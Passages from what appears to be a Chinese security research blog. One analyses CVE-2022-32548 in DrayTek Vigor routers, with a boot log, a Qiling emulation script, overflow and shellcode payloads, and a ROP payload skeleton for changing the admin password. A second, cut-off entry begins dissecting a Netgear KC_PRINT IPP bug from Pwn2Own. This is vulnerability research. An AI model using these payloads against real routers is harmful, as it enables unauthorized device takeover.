irq=31, desc=80a80d30, p=80a80030</span><br><span class="line">desc-&gt;chip=80a801d0, desc-&gt;chip-&gt;startup=80030078</span><br><span class="line"></span><br><span class="line"> time_init()...</span><br><span class="line"> skb_init() donePrimary instruction cache 64kB, VIPT, 4-way, linesize 32 bytes.</span><br><span class="line">Primary data cache 32kB, 4-way, VIPT, cache aliases, linesize 32 bytes</span><br><span class="line"></span><br><span class="line"> cache_init() <span class="keyword">done</span></span><br><span class="line"> ralink_led_init() <span class="keyword">done</span>!!!__setup_irq: irq=29, desc=80a80c90, p=821e8fa0</span><br><span class="line">desc-&gt;chip=80a801d0, desc-&gt;chip-&gt;startup=80030078</span><br><span class="line">Adapter_Interrupts_Init: Successfully hooked IRQ 29</span><br><span class="line"></span><br><span class="line">Adapter_Interrupts_Init: call back registeredAdapter_EIP93_Init: CmdRing_Handle=82e7232c</span><br><span class="line">Adapter_EIP93_Init: ResRing_Handle=82e72328</span><br><span class="line">Adapter: Successfully initialized EIP93v2 <span class="keyword">in</span> ARM mode</span><br><span class="line">PEC_Init: PRNG is initialized</span><br><span class="line">== IPSEC Crypto Engine Driver : Jul  8 2020 15:25:56 ==</span><br><span class="line"></span><br><span class="line"> hw_crypto_init() <span class="keyword">done</span></span><br><span class="line"> NR_IRQS=64.</span><br><span class="line"> ** Enable Global Int **..end..</span><br><span class="line">flash manufacture id: c2, device id 20 17</span><br><span class="line">MX25L6405D(c2 2017c220) (8192 Kbytes)</span><br><span class="line">../sys_misc.c.584: snprintf <span class="built_in">test</span> pass!</span><br><span class="line">../sys_misc.c.584: vsnprintf <span class="built_in">test</span> pass!</span><br><span class="line">GMAC1_MAC_ADRH -- : 0x0000001d</span><br><span class="line">SMACCR1 -- : 0x0000001d</span><br><span class="line">GMAC1_MAC_ADRL -- : 0xaa93e52c</span><br><span class="line">SMACCR0 -- : 0xaa93e52c</span><br><span class="line">Ralink APSoC Ethernet Driver Initilization. v3.0  256 rx/tx descriptors allocated, mtu = 1500!</span><br><span class="line">Raeth v3.0 (Workqueue)</span><br><span class="line">__setup_irq: irq=22, desc=80a80a60, p=821e8ea0</span><br><span class="line">desc-&gt;chip=80a801d0, desc-&gt;chip-&gt;startup=80030078</span><br><span class="line"></span><br><span class="line">phy_tx_ring = 0x021ef000, tx_ring = 0xa21ef000</span><br><span class="line"></span><br><span class="line">phy_rx_ring0 = 0x022c6000, rx_ring0 = 0xa22c6000</span><br><span class="line">Fiber ID does not match (FFFF, FFFF)</span><br><span class="line">Fiber does not exist</span><br><span class="line">GMAC1_MAC_ADRH -- : 0x0000001d</span><br><span class="line">SMACCR1 -- : 0x0000001d</span><br><span class="line">GMAC1_MAC_ADRL -- : 0xaa93e52c</span><br><span class="line">SMACCR0 -- : 0xaa93e52c</span><br><span class="line">__setup_irq: irq=16, desc=80a80880, p=821e8e20</span><br><span class="line">desc-&gt;chip=80a801d0, desc-&gt;chip-&gt;startup=80030078</span><br><span class="line">ESW: Link Status Changed - Port2 Link UP</span><br><span class="line">CDMA_CSG_CFG = 81000007</span><br><span class="line">GDMA1_FWD_CFG = C0710000</span><br><span class="line">start PCIe register access</span><br><span class="line"></span><br><span class="line">*************** RT6855A PCIe RC mode *************</span><br><span class="line">PCIE0 no card, <span class="built_in">disable</span> it</span><br><span class="line">PCIE1 no card, <span class="built_in">disable</span> it(RST&amp;CLK)</span><br><span class="line">&lt;4&gt;registering PCI controller with io_map_base <span class="built_in">unset</span></span><br><span class="line"></span><br><span class="line">[SS][Init] Load Service Status from FLASH!!</span><br><span class="line">&lt;6&gt;uVigor2912 by DrayTek Corp.erface driver hub</span><br><span class="line">&lt;6&gt;u==========================ice driver usb</span><br><span class="line">    LAN MAC Address  : 00-1D-AA-93-E5-2C</span><br><span class="line"> usbIP Address       : 192.168.2.1</span><br><span class="line">RT3xIP Subnet Mask   : 255.255.255.0</span><br><span class="line">&lt;6&gt;eFirmware Version : 3.8.12d<span class="string">&#x27; Host Controller (EHCI) Driver</span></span><br><span class="line"><span class="string">__seSystem Up Time   : 0:0:0a80920, p=822ddfa0</span></span><br><span class="line"><span class="string">desc-------- Main Menu ---------&gt;startup=80030078</span></span><br><span class="line"><span class="string">FIXM1 : Enable TFTP Server</span></span><br><span class="line"><span class="string">   Please Select Item : &lt;6&gt;ohci_hcd: USB 1.1 &#x27;</span>Open<span class="string">&#x27; Host Controller (OHCI) Driver</span></span><br><span class="line"><span class="string">VLAN table[2~7] cleaned</span></span><br><span class="line"><span class="string"> usb host init done!!</span></span><br><span class="line"><span class="string">&lt;6&gt;usbcore: registered new interface driver usblp</span></span><br><span class="line"><span class="string">----&gt; usb_net_init()aned</span></span><br><span class="line"><span class="string">&lt;6&gt;usbcore: registered new interface driver LTE device driver</span></span><br><span class="line"><span class="string">&lt;---- usb_net_init()) is 1 **</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ----------------&gt; usb_register&lt;6&gt;usbcore: registered new interface driver usbserial</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ----------------&gt; usb_serial_generic_register</span></span><br><span class="line"><span class="string"> ** DrayDown event==0 **</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ** DrayUp event==0 **</span></span><br><span class="line"><span class="string">&lt;6&gt;usbcore: registered new interface driver usbserial_generic</span></span><br><span class="line"><span class="string">Initializing USB Mass Storage driver...</span></span><br><span class="line"><span class="string">                                       &lt;6&gt;usbcore: registered new interface driver usb-storage</span></span><br><span class="line"><span class="string">USB Mass Storage support registered.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> &lt;&lt; sys_board_init_later &gt;&gt;</span></span><br></pre></td></tr></table></figure><p>当我们通过 PoC 攻击设备之后，可以从日志输出看到一些 dump 信息, 输出包括  EPC ， 当前崩溃的地址， 如这里里是 0xdeadbeaf， </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-30-af71d98c211dbd6a59feee082ebe15b6-3fdfed.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-30-af71d98c211dbd6a59feee082ebe15b6-3fdfed.png"></a></p><p>还会打印栈 和 寄存器</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-30-92f19cb9d0608f4f58d3e4cd244c72b1-392eaf.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-30-92f19cb9d0608f4f58d3e4cd244c72b1-392eaf.png"></a></p><p>我们可以通过这些输出来调整我们的 PoC, 来达到我们目的，另外为了更方便的调试， 我还使用了 qiling 进行部分代码的模拟, 思路如下：</p><p>前面跑一段随便的 shellcode ，然后将 RTOS 整个 binary 读起来， 写入到我 mmap 的内存中。然后设置PC 跳转过去。最后的代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">sys.path.append(<span class="string">&quot;..&quot;</span>)</span><br><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> Qiling</span><br><span class="line"><span class="keyword">from</span> qiling.const <span class="keyword">import</span> QL_VERBOSE</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode_con = asm(shellcraft.connect(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1337</span>))</span><br><span class="line"></span><br><span class="line">password_addr = <span class="number">0x81B898A0</span></span><br><span class="line">die_func_addr   = <span class="number">0x8007EF90</span> </span><br><span class="line">test_addr = <span class="number">0x8007EF74</span></span><br><span class="line">proxy = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span> : <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pay = <span class="string">b&#x27;admin\x00\x00\x00&#x27;</span></span><br><span class="line">pay+= <span class="string">b&#x27;B&#x27;</span>* (<span class="number">0x118</span> - <span class="number">8</span> - <span class="number">8</span>)</span><br><span class="line"><span class="comment"># pay+= p32(0xdeadbeaf) # s0</span></span><br><span class="line">pay+= p32(password_addr) <span class="comment"># s1   </span></span><br><span class="line">pay+= <span class="string">b&#x27;C&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">pay+= p32(test_addr) <span class="comment"># ra</span></span><br><span class="line"></span><br><span class="line">padding = <span class="built_in">len</span>(pay) - <span class="number">84</span></span><br><span class="line"></span><br><span class="line">payload = base64.b64encode(pay).decode(<span class="string">&#x27;latin&#x27;</span>) + <span class="string">&#x27;=&#x27;</span> * (padding * <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_1</span>(<span class="params">ql</span>):</span></span><br><span class="line">    ql.log.info(<span class="string">&#x27;now run at: 0x807767A0&#x27;</span>)</span><br><span class="line">    ql.reg.write(<span class="string">&#x27;a0&#x27;</span>, <span class="number">0x21000000</span>)</span><br><span class="line">    ql.reg.arch_pc = <span class="number">0x807768B8</span> <span class="comment"># decode username</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_2</span>(<span class="params">ql</span>):</span></span><br><span class="line">    ql.reg.arch_pc = <span class="number">0x807766ec</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_3</span>(<span class="params">ql</span>):</span></span><br><span class="line">    ql.reg.arch_pc = <span class="number">0x80776808</span> </span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>, endian=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">MIPS32EL_LIN = unhexlify(<span class="string">&#x27;ffff0628ffffd004ffff05280110e4270ff08424ab0f02240c0101012f62696e2f7368&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nVigor 2912 emu&quot;</span>)</span><br><span class="line">    ql = Qiling(code=shellcode, archtype=<span class="string">&quot;mips&quot;</span>, ostype=<span class="string">&quot;linux&quot;</span>, verbose=QL_VERBOSE.DEFAULT)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;v2912_3812-kernel&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(data)))</span><br><span class="line">    <span class="comment"># mmap memory</span></span><br><span class="line"></span><br><span class="line">    ql.mem.<span class="built_in">map</span>(<span class="number">0x20000000</span>, <span class="number">0x3000000</span>, info=<span class="string">&quot;[STACK  ]&quot;</span>)</span><br><span class="line">    ql.mem.<span class="built_in">map</span>(<span class="number">0x23000000</span>, <span class="number">0x3000000</span>, info=<span class="string">&quot;[SHELLCODE  ]&quot;</span>)</span><br><span class="line">    ql.mem.<span class="built_in">map</span>(<span class="number">0x80020000</span>, <span class="built_in">len</span>(data) + <span class="number">4092</span>, info=<span class="string">&quot;[RTOS ]&quot;</span>)</span><br><span class="line">    ql.mem.<span class="built_in">map</span>(<span class="number">0x82000000</span>, <span class="number">0x4000000</span>)</span><br><span class="line">    ql.mem.show_mapinfo()</span><br><span class="line">    ql.mem.write(<span class="number">0x80020000</span>, data) <span class="comment"># rtos data</span></span><br><span class="line">    ql.mem.write(<span class="number">0x21000000</span>, payload.encode(<span class="string">&#x27;latin&#x27;</span>))</span><br><span class="line">    ql.mem.write(<span class="number">0x23000000</span>, shellcode_con)</span><br><span class="line"></span><br><span class="line">    ql.reg.arch_sp = <span class="number">0x20002000</span> <span class="comment">#sp</span></span><br><span class="line">    ql.reg.arch_pc = <span class="number">0x807766EC</span> <span class="comment">#pc</span></span><br><span class="line">    ql.reg.write(<span class="string">&#x27;ra&#x27;</span>, <span class="number">0xdeadbeaf</span>)</span><br><span class="line">    ql.reg.write(<span class="string">&#x27;a0&#x27;</span>, <span class="number">0x21000000</span>)</span><br><span class="line">    ql.hook_address(hook_1, <span class="number">0x807767A0</span>)</span><br><span class="line">    ql.hook_address(hook_2, <span class="number">0x11ff004</span>) <span class="comment"># hjack PC to target functio start address</span></span><br><span class="line">    ql.hook_address(hook_3, <span class="number">0x807768F8</span>)</span><br><span class="line">    <span class="comment"># ql.hook_mem_unmapped(memroy_fix)</span></span><br><span class="line">    ql.debugger = <span class="literal">True</span></span><br><span class="line">    ql.run(begin=<span class="number">0x807766EC</span>)</span><br></pre></td></tr></table></figure><p>利用思路：</p><p>[x] ret2shellcode :<br>    在尝试这个方法的时候， 发现没法执行 shellcode， 猜测是 指令流水线  cache incoherency  特性， 可能需要刷新指令， 但是调用了个 <code>usleep(10000)</code></p><p>虽然看起来 PC 往后移动了， 但是仍然没执行成功， 原因不明。</p><p>[✓] rop chain</p><p>在逆向一些 cmdlist 的过程中， 发现一个修改密码接口</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-30-be60d5f11a1865aa7487931264edfee5-8e53df.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-30-be60d5f11a1865aa7487931264edfee5-8e53df.png"></a></p><p>于是我跳转到这个地方， 修改密码 。这里有一些需要跳过坑点，具体可以留给感兴趣的读者了。这里提供一个 PoC 给读者</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pay = flat(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment"># 0: b&#x27;admi1\x00\x00\x00&#x27;,</span></span><br><span class="line">        <span class="comment"># 8: shellcode,</span></span><br><span class="line">        <span class="number">272</span>: p32(<span class="number">0xdeadbea0</span>),   <span class="comment"># s0 -&gt; </span></span><br><span class="line">        <span class="number">276</span>: p32(<span class="number">0xdeadbea1</span>),   <span class="comment"># s1 </span></span><br><span class="line">        <span class="number">280</span>: p32(<span class="number">0xdeadbea2</span>),   <span class="comment"># s2 -&gt;</span></span><br><span class="line">        <span class="number">284</span>: p32(<span class="number">0xdeadbea3</span>),   <span class="comment"># s3</span></span><br><span class="line">        <span class="number">288</span>: p32(<span class="number">0xdeadbea4</span>),   <span class="comment"># s4</span></span><br><span class="line">        <span class="number">292</span>: p32(<span class="number">0xdeadbea5</span>),   <span class="comment"># s5</span></span><br><span class="line">        <span class="number">296</span>: p32(<span class="number">0xdeadbea6</span>),   <span class="comment"># s6</span></span><br><span class="line">        <span class="number">308</span>: p32(<span class="number">0xdeadbeaf</span>),   <span class="comment"># ra </span></span><br><span class="line">        <span class="number">360</span>: p32(<span class="number">0x808EC000</span>),   <span class="comment"># </span></span><br><span class="line">        <span class="number">372</span>: p32(<span class="number">0x808EC000</span>),   <span class="comment">#</span></span><br><span class="line">        <span class="number">372</span>+<span class="number">0x40</span> +<span class="number">4</span>: p32(<span class="number">0xdeadbeaf</span>),   <span class="comment"># next ra </span></span><br><span class="line">        <span class="number">432</span>: p32(<span class="number">0xdeadbeaf</span>)   <span class="comment"># next v2 </span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-30-1383c80801d983eb6a2e3ca3bd499a9b-75928d.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-30-1383c80801d983eb6a2e3ca3bd499a9b-75928d.png"></a></p><p>cmdlist  中一个功能可以用来dump内存，方便调试 。 但是注意这里的 0x800000, 我们需要设置当前用户的权限为 0x800000。 这里就是另外一个挑战了，也留给读者自己解决吧。 2333</p><h2 id="Reference-link"><a href="#Reference-link" class="headerlink" title="Reference link"></a>Reference link</h2><div id="footnotes"><hr><div id="footnotelist"><ol style="list-style: none; padding-left: 0; margin-left: 40px"><li id="fn:1"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">1.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;"><a href="https://fw.draytek.com.tw/Vigor2925/">Index of /Vigor2925 (draytek.com.tw)</a><a href="#fnref:1" rev="footnote"> ↩</a></span></li><li id="fn:2"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">2.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;"><a href="https://www.youtube.com/watch?v=CD8HfjdDeuM">HEXACON2022 - Emulate it until you make it! Pwning a DrayTek Router by Philippe Laulheret - YouTube</a><a href="#fnref:2" rev="footnote"> ↩</a></span></li><li id="fn:3"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">3.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;"><a href="https://github.com/sgayou/rbasefind">sgayou/rbasefind: A firmware base address search tool. (github.com)</a><a href="#fnref:3" rev="footnote"> ↩</a></span></li><li id="fn:4"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">4.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;"><a href="https://www.trellix.com/en-us/about/newsroom/stories/research/rce-in-dratyek-routers.html">Unauthenticated Remote Code Execution in a Wide Range of DrayTek Vigor Routers (trellix.com)</a><a href="#fnref:4" rev="footnote"> ↩</a></span></li></ol></div></div></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; hr</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="pwn" scheme="https://bestwing.me/tags/pwn/"/>
    
    <category term="CVE-2022-32548" scheme="https://bestwing.me/tags/CVE-2022-32548/"/>
    
  </entry>
  
  <entry>
    <title>Nccgroup Pwn2Own 中攻破 Netgear R6700路由器的漏洞分析</title>
    <link href="https://bestwing.me/nccgroup-in-pwn2own-pwned-netgear-r6700-route-vulnerability-analysis.html"/>
    <id>https://bestwing.me/nccgroup-in-pwn2own-pwned-netgear-r6700-route-vulnerability-analysis.html</id>
    <published>2022-09-08T08:06:00.000Z</published>
    <updated>2022-09-08T06:56:38.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前几天 sectoday 推了一个关于 <code>NCC 研究员参加 Pwn2Own Austin 2021 比赛攻破路由器、NAS、打印机的技术细节分享</code> 的推送。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-e66939850217aae2c222c419224b1d80-7753dc.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-e66939850217aae2c222c419224b1d80-7753dc.png"></a></p><p>其中有一个篇章是讲 Netgear  R6700 Router 的， 恰好我上上篇分享的文章 <a href="https://bestwing.me/PSV-2020-0437-Buffer-Overflow-on-Some-Netgear-outers.html">PSV-2020-0437:Buffer-Overflow-on-Some-Netgear-Routers</a> 所使用的路由器型号以及固件版本也在该漏洞影响范围之内。因此打算分析这个漏洞，并自己写一下这个漏洞的 exploit 。</p><p>注：</p><p>分析以及利用的路由器型号为： R6400v2 ， 固件版本为：V1.0.4.102_10.0.75</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>通过 slide 可以得知， nccgroup 所发现的漏洞在 <code>KC_PRINT</code>  这个程序里，所攻击端口为 <code>631</code> 端口。 根据我浅薄的知识，第一反映这是一个和 IPP (Internet Printing Protocol，缩写IPP, 是一个用于通过互联网打印文件的标准网络协议) 有关的程序。 在后面的进一步分析的过程中，确实验证了我的猜想。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-20a0f61dacf5f6c238e2e5917b83659f-4734c8.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-20a0f61dacf5f6c238e2e5917b83659f-4734c8.png"></a></p><p><code>KC_PRINT</code> 使用不同的线程来处理不同的功能， </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-1d0be4ee778833f6e89bf8f2b9769be9-750d1f.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-1d0be4ee778833f6e89bf8f2b9769be9-750d1f.png"></a></p><p>而该漏洞是发生在 <code>ipp_server</code> 线程里面的。 其大致入口代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( setsockopt(fd, <span class="number">1</span>, <span class="number">2</span>, &amp;optval, <span class="number">4u</span>) &lt; <span class="number">0</span> )</span><br><span class="line"> &#123;</span><br><span class="line">   perror(<span class="string">&quot;ipp_server: setsockopt SO_REUSEADDR failed&quot;</span>);</span><br><span class="line">   close(fd);</span><br><span class="line">   pthread_attr_destroy(&amp;attr);</span><br><span class="line">   pthread_exit(<span class="number">0</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> s.sa_family = <span class="number">2</span>;</span><br><span class="line"> *(_DWORD *)&amp;s.sa_data[<span class="number">2</span>] = htonl(<span class="number">0</span>);</span><br><span class="line"> *(_WORD *)s.sa_data = htons(<span class="number">631u</span>); </span><br><span class="line"> <span class="keyword">if</span> ( bind(fd, &amp;s, <span class="number">0x10</span>u) &lt; <span class="number">0</span> ) <span class="comment">// 在 631 端口监听</span></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line"> listen(fd, <span class="number">128</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ( flag )</span><br><span class="line"> &#123;</span><br><span class="line">   newfd = accept(fd, &amp;addr, &amp;addr_len);</span><br><span class="line">   <span class="keyword">if</span> ( newfd &gt;= <span class="number">0</span> )</span><br><span class="line">   &#123;</span><br><span class="line">     sub_A0FC(<span class="number">1</span>);</span><br><span class="line">     v1[<span class="number">0</span>] = <span class="number">60</span>;</span><br><span class="line">     v1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">     <span class="keyword">if</span> ( setsockopt(newfd, <span class="number">1</span>, <span class="number">20</span>, v1, <span class="number">8u</span>) &lt; <span class="number">0</span> )</span><br><span class="line">       perror(<span class="string">&quot;ipp_server: setsockopt SO_RCVTIMEO failed&quot;</span>);</span><br><span class="line">     Fd = <span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">     <span class="keyword">if</span> ( Fd )</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="built_in">memset</span>(Fd, <span class="number">0</span>, <span class="number">8u</span>);</span><br><span class="line">       *Fd = newfd;</span><br><span class="line">       pthread_mutex_lock(&amp;stru_18B40);</span><br><span class="line">       v6 = sub_16068();</span><br><span class="line">       <span class="keyword">if</span> ( v6 &lt; <span class="number">0</span> )</span><br><span class="line">       &#123;</span><br><span class="line">...</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span> <span class="keyword">if</span> ( pthread_create(&amp;dword_18740[v6], &amp;attr, do_ipp_http_thread, Fd) )</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>然后会进入到  <code>do_ipp_http_thread</code> 函数里， 该函数会进一步调用一个 <code>do_http</code> 的函数。 该函数用来处理对应的 IPP 协议的 HTTP 请求。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">n = recv_n(fd, buf, <span class="number">1024</span>);</span><br><span class="line"><span class="keyword">if</span> ( n &lt;= <span class="number">0</span> )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">strstr</span>(buf, <span class="string">&quot;100-continue&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line">HTTP_INPUT = <span class="built_in">strstr</span>(buf, <span class="string">&quot;POST /USB&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !HTTP_INPUT )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">HTTP_INPUT += <span class="number">9</span>;</span><br><span class="line">v18 = <span class="built_in">strstr</span>(HTTP_INPUT, <span class="string">&quot;_LQ&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !v18 )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">v13 = *v18;</span><br><span class="line">*v18 = <span class="number">0</span>;</span><br><span class="line">usblp_index = atoi(HTTP_INPUT);</span><br><span class="line">*v18 = v13;</span><br><span class="line"><span class="keyword">if</span> ( usblp_index &gt; <span class="number">10</span> )</span><br><span 